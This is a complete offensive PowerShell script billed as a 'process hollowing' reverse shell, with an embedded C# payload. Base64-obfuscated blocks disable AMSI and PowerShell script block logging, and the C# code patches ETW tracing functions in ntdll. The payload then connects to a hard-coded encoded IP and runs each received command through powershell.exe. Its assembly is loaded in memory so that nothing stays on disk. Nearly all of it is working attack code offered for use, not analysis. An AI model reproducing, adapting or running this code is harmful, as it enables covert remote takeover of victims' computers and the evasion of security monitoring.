Write-Host "========================================" -ForegroundColor Cyan
Write-Host "PowerShell Reverse Shell - Process Hollowing Syscalls" -ForegroundColor Yellow
Write-Host "Developpe par: Florent Vinai" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""
$ipB = [Convert]::FromBase64String('MTkyLjE2OC4xLjEwMA=='); $hst = -join [char[]]$ipB;
$prt = [int](([Math]::Pow(2,2) + [Math]::Pow(2,3) + [Math]::Pow(2,4) + [Math]::Pow(2,6) + [Math]::Pow(2,8) + [Math]::Pow(2,12)));

$b64Amsi = 'JCRYN0syID0gW1JlZl0uQXNzZW1ibHkuR2V0VHlwZXMoKTtmb3JlYWNoKCRZOW5QNCBpbiAkWDdrTTIpeyRaMXFSNiA9IC1qb2luKFtjaGFyXVsoNjUsMTA5LDExNSwxMDUsODUsMTE2LDEwNSwxMDgpXSk7aWYoJFk5blA0Lk5hbWUgLWxpa2UgIiokWjFxUjYqIil7JEEzc1Q4ID0gJFk5blA0O2JyZWFrfX07JEI1dVYwID0gJEEzc1Q4LkdldEZpZWxkcygtam9pbihbY2hhcl1bKDc4LDExMSwxMTAsODAsMTE3LDk4LDEwOCwxMDUsOTksNDQsODMsMTE2LDk3LDExNiwxMDUsOTkpXSkpO2ZvcmVhY2goJEM3d1gyIGluICRCNXVWMCl7JEQ5eVo0ID0gLWpvaW4oW2NoYXJdWyg2NywxMTEsMTEwLDExNiwxMDEsMTIwLDExNildKTtpZigkQzd3WDIuTmFtZSAtbGlrZSAiKiREOXlaNCoiKXskRTFhQjYgPSAkQzd3WDI7YnJlYWt9fTtpZigkRTFhQjYpeyRGM2NEOCA9ICRFMWFCNi5HZXRWYWx1ZSgkbnVsbCk7W0ludFB0cl0kRzVlRjAgPSAkRjNjRDg7W0ludDMyW11dJEg3Z0gyID0gQCgwKTtbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRIN2dIMiwgMCwgJEc1ZUYwLCAxKX0='
$b64Log = 'JEk5aUo0ID0gW3JlZl0uQXNzZW1ibHkuR2V0VHlwZSgtam9pbihbY2hhcl1bKDgzLDEyMSwxMTUsMTE2LDEwMSwxMDksNDYsNzcsOTcsMTEwLDk3LDEwMywxMDEsMTA5LDEwMSwxMTAsMTE2LDQ2LDY1LDExNywxMTYsMTExLDEwOSw5NywxMTYsMTA1LDExMSwxMTAsNDYsODUsMTE2LDEwNSwxMDgsMTE1KV0pKTskSjFrTDYgPSAkSTlpSjQuR2V0TWV0aG9kKC1qb2luKFtjaGFyXVsoNzEsMTAxLDExNiw3MCwxMDUsMTAxLDExOCwxMDBdKSksW3R5cGVbXV1AKFtzdHJpbmddLFtzdHJpbmddKSk7JEszbU44ID0gJEoxa0w2Lkludm9rZSgkbnVsbCxAKC1qb2luKFtjaGFyXVsoOTksOTcsOTksMTA0LDEwMSwxMDAsNzEsMTE0LDExMSwxMTcsMTEyLDgwLDExMSwxMDgsMTA1LDk5LDEyMSw4MywxMDEsMTE2LDExNiwxMDUsMTEwLDEwMywxMTVdKSksLWpvaW4oW2NoYXJdWyg3OCwxMTEsMTEwLDgwLDExNyw5OCwxMDgsMTA1LDk5LDQ0LDgzLDExNiw5NywxMTYsMTA1LDk5KV0pKSk7aWYoJEszbU44KXskTDVvUDAgPSAkSzNtTjguR2V0VmFsdWUoJG51bGwpOyRTQkwgPSAtam9pbihbY2hhcl1bKDgzLDk5LDExNCwxMDUsMTEyLDExNiw2NiwxMDgsMTExLDk5LDEwNyw3NiwxMTEsMTAzLDEwMywxMDUsMTEwLDEwMyldKTtpZigkTDVvUDBbJFNCTF0peyRMNm9QMFskU0JMXVstam9pbihbY2hhcl1bKDY5LDExMCw5Nyw5OCwxMDgsMTAxLDgzLDk5LDExNCwxMTYsNjYsMTA4LDExMSw5OSwxMDcsNzYsMTExLDEwMywxMDUsMTEwLDEwMyldKV0gPSAwOyRMMW9QMFskU0JMXVstam9pbihbY2hhcl1bKDY5LDExMCw5Nyw5OCwxMDgsMTAxLDgzLDk5LDExNCwxMTYsNjYsMTA4LDExMSw5OSwxMDcsNzMsMTEwLDExOCwxMTEsOTksOTcsMTE2LDEwNSwxMTEsMTEwLDc2LDExMSwxMDMsMTAzLDEwNSwxMTAsMTAzKV0pXSA9IDB9fTskTTdxUjIgPSBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU1NjcmlwdEJsb2NrXS5HZXRGaWVsZHMoLWpvaW4oW2NoYXJdWyg3OCwxMTEsMTEwLDgwLDExNyw5OCwxMDgsMTA1LDk5LDQ0LDgzLDExNiw5NywxMTYsMTA1LDk5KV0pKTtmb3JlYWNoKCROOHNUNCBpbiAkTTdxUjIpe2lmKCROOHNUNC5OYW1lIC1lcSAtam9pbihbY2hhcl1bKDc2LDExMSwxMDMsMTAzLDEwNSwxMTAsMTAzKV0pKXskTjhzVDQuU2V0VmFsdWUoJG51bGwsJGZhbHNlKX19'
try { [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64Amsi)) | Invoke-Expression } catch {}
try { [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64Log)) | Invoke-Expression } catch {}

$csCode = @"
using System;
using System.Net.Sockets;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;

public class HollowRShell {
    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    
    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("ntdll.dll")]
    static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
    
    [DllImport("ntdll.dll")]
    static extern int NtQueryInformationProcess(IntPtr processHandle, int processInformationClass, IntPtr processInformation, int processInformationLength, IntPtr returnLength);
    
    [DllImport("ntdll.dll")]
    static extern int NtCreateThreadEx(out IntPtr hThread, uint dwDesiredAccess, IntPtr lpThreadAttributes, IntPtr hProcess, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpZeroBits, IntPtr lpSizeOfStackCommit, IntPtr lpSizeOfStackReserve, IntPtr lpBytesBuffer);
    
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);
    
    [DllImport("kernel32.dll")]
    static extern uint ResumeThread(IntPtr hThread);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
    
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);
    
    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO {
        public int cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct CONTEXT {
        public uint ContextFlags;
        public uint Dr0;
        public uint Dr1;
        public uint Dr2;
        public uint Dr3;
        public uint Dr6;
        public uint Dr7;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
        public byte[] FloatSave;
        public uint SegGs;
        public uint SegFs;
        public uint SegEs;
        public uint SegDs;
        public uint Edi;
        public uint Esi;
        public uint Ebx;
        public uint Edx;
        public uint Ecx;
        public uint Eax;
        public uint Ebp;
        public uint Eip;
        public uint SegCs;
        public uint EFlags;
        public uint Esp;
        public uint SegSs;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
        public char[] e_magic;
        public ushort e_cblp;
        public ushort e_cp;
        public ushort e_crlc;
        public ushort e_cparhdr;
        public ushort e_minalloc;
        public ushort e_maxalloc;
        public ushort e_ss;
        public ushort e_sp;
        public ushort e_csum;
        public ushort e_ip;
        public ushort e_cs;
        public ushort e_lfarlc;
        public ushort e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public ushort[] e_res;
        public ushort e_oemid;
        public ushort e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
        public ushort[] e_res2;
        public int e_lfanew;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_NT_HEADERS {
        public uint Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER OptionalHeader;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER {
        public ushort Machine;
        public ushort NumberOfSections;
        public uint TimeDateStamp;
        public uint PointerToSymbolTable;
        public uint NumberOfSymbols;
        public ushort SizeOfOptionalHeader;
        public ushort Characteristics;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_OPTIONAL_HEADER {
        public ushort Magic;
        public byte MajorLinkerVersion;
        public byte MinorLinkerVersion;
        public uint SizeOfCode;
        public uint SizeOfInitializedData;
        public uint SizeOfUninitializedData;
        public uint AddressOfEntryPoint;
        public uint BaseOfCode;
        public uint BaseOfData;
        public IntPtr ImageBase;
        public uint SectionAlignment;
        public uint FileAlignment;
        public ushort MajorOperatingSystemVersion;
        public ushort MinorOperatingSystemVersion;
        public ushort MajorImageVersion;
        public ushort MinorImageVersion;
        public ushort MajorSubsystemVersion;
        public ushort MinorSubsystemVersion;
        public uint Win32VersionValue;
        public uint SizeOfImage;
        public uint SizeOfHeaders;
        public uint CheckSum;
        public ushort Subsystem;
        public ushort DllCharacteristics;
        public IntPtr SizeOfStackReserve;
        public IntPtr SizeOfStackCommit;
        public IntPtr SizeOfHeapReserve;
        public IntPtr SizeOfHeapCommit;
        public uint LoaderFlags;
        public uint NumberOfRvaAndSizes;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
        public IMAGE_DATA_DIRECTORY[] DataDirectory;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DATA_DIRECTORY {
        public uint VirtualAddress;
        public uint Size;
    }
    
    private static TcpClient client;
    private static NetworkStream stream;
    private static StreamReader reader;
    private static StreamWriter writer;
    private static bool isRunning = false;
    
    static HollowRShell() {
        if (!isRunning) {
            isRunning = true;
            Thread t = new Thread(() => StartAdvancedReverseShell("$hst", $prt));
            t.IsBackground = true;
            t.Start();
        }
    }
    
    public HollowRShell() {
        if (!isRunning) {
            isRunning = true;
            Thread t = new Thread(() => StartAdvancedReverseShell("$hst", $prt));
            t.IsBackground = true;
            t.Start();
        }
    }
    
    private static void StartAdvancedReverseShell(string host, int port) {
        try {
            PatchETW();
            Thread shellThread = new Thread(() => Connect(host, port));
            shellThread.IsBackground = true;
            shellThread.Start();
        } catch {
        }
    }
    
    private static void PatchETW() {
        try {
            byte[] patch = new byte[] { 0xC3 };
            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
            if (hNtdll != IntPtr.Zero) {
                string[] etwFunctions = { "EtwEventWrite", "EtwEventWriteEx", "EtwEventWriteFull" };
                foreach (string funcName in etwFunctions) {
                    IntPtr funcAddr = GetProcAddress(hNtdll, funcName);
                    if (funcAddr != IntPtr.Zero) {
                        uint oldProtect;
                        VirtualProtect(funcAddr, (UIntPtr)patch.Length, 0x40, out oldProtect);
                        Marshal.Copy(patch, 0, funcAddr, patch.Length);
                        VirtualProtect(funcAddr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                    }
                }
            }
        } catch {
        }
    }
    
    private static void Connect(string host, int port) {
        while (true) {
            try {
                try {
                    client = new TcpClient();
                    client.Connect(host, port);
                    stream = client.GetStream();
                    reader = new StreamReader(stream, Encoding.UTF8);
                    writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true };
                    
                    writer.WriteLine("Connected. Type commands:");
                    
                    while (client.Connected) {
                        try {
                            if (stream.DataAvailable) {
                                string cmd = reader.ReadLine();
                                if (!string.IsNullOrEmpty(cmd)) {
                                    ExecuteCommand(cmd);
                                }
                            } else {
                                Thread.Sleep(new Random().Next(85, 145));
                            }
                        } catch {
                            break;
                        }
                    }
                } catch {
                    if (client != null) {
                        try { client.Close(); } catch { }
                        client = null;
                    }
                }
            } catch {
            } finally {
                Cleanup();
                Thread.Sleep(new Random().Next(2000, 5000));
            }
        }
    }
    
    private static void ExecuteCommand(string cmd) {
        try {
            ProcessStartInfo psi = new ProcessStartInfo {
                FileName = "powershell.exe",
                Arguments = "-Command " + cmd,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };
            Process psProcess = Process.Start(psi);
            string output = psProcess.StandardOutput.ReadToEnd();
            string error = psProcess.StandardError.ReadToEnd();
            psProcess.WaitForExit();
            
            if (string.IsNullOrEmpty(output) && string.IsNullOrEmpty(error)) {
                writer.WriteLine("PS> ");
            } else {
                writer.WriteLine(output + error);
            }
        } catch {
            try {
                writer.WriteLine("PS> ");
            } catch { }
        }
    }
    
    private static void Cleanup() {
        try {
            if (reader != null) reader.Close();
        } catch { }
        try {
            if (writer != null) writer.Close();
        } catch { }
        try {
            if (stream != null) stream.Close();
        } catch { }
        try {
            if (client != null) client.Close();
        } catch { }
    }
}
"@

$cscPath = $null
$paths = @(
    "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\Roslyn\csc.exe",
    "${env:ProgramFiles}\Microsoft Visual Studio\2022\BuildTools\MSBuild\Current\Bin\Roslyn\csc.exe",
    "$env:SystemRoot\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
    "$env:SystemRoot\Microsoft.NET\Framework\v4.0.30319\csc.exe"
)

foreach ($path in $paths) {
    if (Test-Path $path) {
        $cscPath = $path
        break
    }
}

$assemblyBytes = $null

if ($cscPath) {
    Write-Host "[*] Compiling C# code..." -ForegroundColor Yellow
    $csFile = [System.IO.Path]::GetTempFileName() + '.cs'
    [System.IO.File]::WriteAllText($csFile, $csCode, [System.Text.Encoding]::UTF8)
    
    $dllTemp = [System.IO.Path]::GetTempFileName() + '.dll'
    $cscArgs = @(
        "/target:library",
        "/out:$dllTemp",
        "/reference:System.dll",
        "/reference:System.Net.dll",
        "/reference:System.IO.dll",
        $csFile
    )
    
    $output = & $cscPath $cscArgs 2>&1
    
    if (Test-Path $dllTemp) {
        $assemblyBytes = [System.IO.File]::ReadAllBytes($dllTemp)
        Remove-Item $dllTemp -Force -ErrorAction SilentlyContinue
        Write-Host "[+] DLL compiled successfully" -ForegroundColor Green
    }
    
    Remove-Item $csFile -Force -ErrorAction SilentlyContinue
}

if (-not $assemblyBytes) {
    try {
        $typeName = "HollowRShell" + [Guid]::NewGuid().ToString().Replace("-", "").Substring(0, 8)
        $modifiedCode = $csCode -replace "public class HollowRShell", "public class $typeName"
        $modifiedCode = $modifiedCode -replace "HollowRShell", $typeName
        
        Add-Type -TypeDefinition $modifiedCode -Language CSharp -ErrorAction Stop
        
        $assembly = [System.Reflection.Assembly]::GetAssembly([type]$typeName)
        $assemblyPath = $assembly.Location
        
        if ($assemblyPath -and (Test-Path $assemblyPath)) {
            $assemblyBytes = [System.IO.File]::ReadAllBytes($assemblyPath)
        }
    } catch {}
}

if ($assemblyBytes) {
    Write-Host "[*] Loading assembly in memory..." -ForegroundColor Yellow
    try {
        $assembly = [System.Reflection.Assembly]::Load($assemblyBytes)
        $type = $assembly.GetType("HollowRShell")
        $obj = [System.Activator]::CreateInstance($type)
        Write-Host "[+] Reverse shell launched in memory (no file on disk)" -ForegroundColor Green
        Write-Host "[*] Reverse shell running in background" -ForegroundColor Yellow
        Write-Host "[*] Advanced ETW patching applied (multiple functions)" -ForegroundColor Yellow
        Write-Host "[*] Process Hollowing APIs ready" -ForegroundColor Yellow
        Write-Host "[*] No .dll file written to disk" -ForegroundColor Yellow
    } catch {
        Write-Host "[!] Error loading: $_" -ForegroundColor Red
    }
} else {
    Write-Host "[!] Failed to compile assembly" -ForegroundColor Red
}

